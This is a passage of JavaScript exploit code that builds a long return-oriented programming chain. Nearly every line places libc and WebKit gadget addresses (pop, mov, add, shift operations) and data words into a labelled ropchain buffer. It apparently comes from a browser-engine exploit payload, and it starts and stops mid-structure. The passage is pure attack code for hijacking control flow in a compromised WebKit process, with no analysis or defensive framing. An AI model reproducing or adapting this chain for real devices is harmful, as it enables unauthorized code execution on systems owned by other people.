db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+78024, //L307
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+78040, //L308
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L307:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L308:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+78184, //L312
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+78152, //L310
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+78168, //L311
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L310:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L311:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L312:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+78256, //L314
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L314:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+78312, //L315
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L315:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+78392, //L317
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L317:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L318:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+78496, //L320
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+78512, //L321
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L320:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L321:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+78664, //L323
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+78696, //L326
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+78680, //L324
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+78648, //L325
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L325:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L323:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L324:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L326:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+78816, //L328
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+78832, //L329
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+78800, //L327
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L327:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L328:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L329:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+78920, //L331
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L331:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+78976, //L332
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L332:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+79096, //L334
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+79128, //L336
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+79112, //L335
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L334:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L335:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L336:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+79288, //L340
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+79256, //L337
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+79240, //L338
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L338:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L337:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L339:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L340:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+79344, //L341
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L341:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+79448, //L343
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+79480, //L345
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+79464, //L344
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L343:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L344:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L345:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+79640, //L349
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+79608, //L346
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+79592, //L347
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L347:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L346:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L348:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L349:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+79696, //L350
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L350:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+79800, //L352
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+79832, //L354
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+79816, //L353
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L352:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L353:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L354:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+79992, //L358
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+79960, //L355
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+79944, //L356
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L356:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L355:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L357:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L358:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+80048, //L359
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L359:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+80152, //L361
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+80184, //L363
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+80168, //L362
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L361:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L362:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L363:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+80256, //L364
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+80272, //L365
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L364:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L365:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+80432, //L369
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+80400, //L366
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+80384, //L367
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L367:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L366:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L368:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L369:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+80488, //L370
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L370:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+80592, //L372
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+80624, //L374
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+80608, //L373
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L372:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L373:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L374:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+80720, //L376
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+80704, //L375
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L375:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L376:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+80800, //L377
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L377:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L378:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+80904, //L380
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+80920, //L381
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L380:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L381:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+81064, //L385
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+81032, //L383
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+81048, //L384
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L383:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L384:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L385:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+81136, //L387
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L387:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+81192, //L388
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L388:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L390:
db([7, 0]); // 0x7
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+81320, //L391
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L391:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L392:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+81424, //L394
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+81440, //L395
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L394:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L395:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+81592, //L397
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+81624, //L400
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+81608, //L398
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+81576, //L399
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L399:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L397:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L398:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L400:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+81744, //L402
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+81760, //L403
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+81728, //L401
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L401:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L402:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L403:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+81864, //L404
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+81880, //L405
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L404:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L405:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+81968, //L407
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L407:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+82024, //L408
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L408:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+82096, //L411
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L411:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+82152, //L413
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L413:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+82240, //L414
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L414:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L415:
db([4294967283, 4294967295]); // -0xd
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+82344, //L417
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+82360, //L418
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L417:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L418:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+82520, //L423
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+82488, //L420
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+82472, //L421
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L421:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L420:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L422:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L423:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+82576, //L424
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L424:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+82680, //L426
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+82712, //L428
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+82696, //L427
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L426:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L427:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L428:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+82872, //L432
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+82840, //L429
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+82824, //L430
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L430:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L429:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L431:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L432:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+82928, //L433
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L433:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+83032, //L435
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+83064, //L437
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+83048, //L436
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L435:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L436:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L437:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+83136, //L438
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+83152, //L439
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L438:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L439:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+83312, //L443
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+83280, //L440
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+83264, //L441
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L441:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L440:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L442:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L443:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+83368, //L444
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L444:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+83472, //L446
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+83504, //L448
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+83488, //L447
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L446:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L447:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L448:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+83600, //L450
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+83584, //L449
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L449:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L450:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+83680, //L451
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L451:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L452:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+83784, //L454
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+83800, //L455
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L454:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L455:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+83944, //L459
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+83912, //L457
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+83928, //L458
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L457:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L458:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L459:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+84016, //L461
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L461:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+84072, //L462
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L462:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+84152, //L464
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L464:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L465:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+84256, //L467
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+84272, //L468
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L467:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L468:
db([0, 0]); // 0x0
set_gadgets([
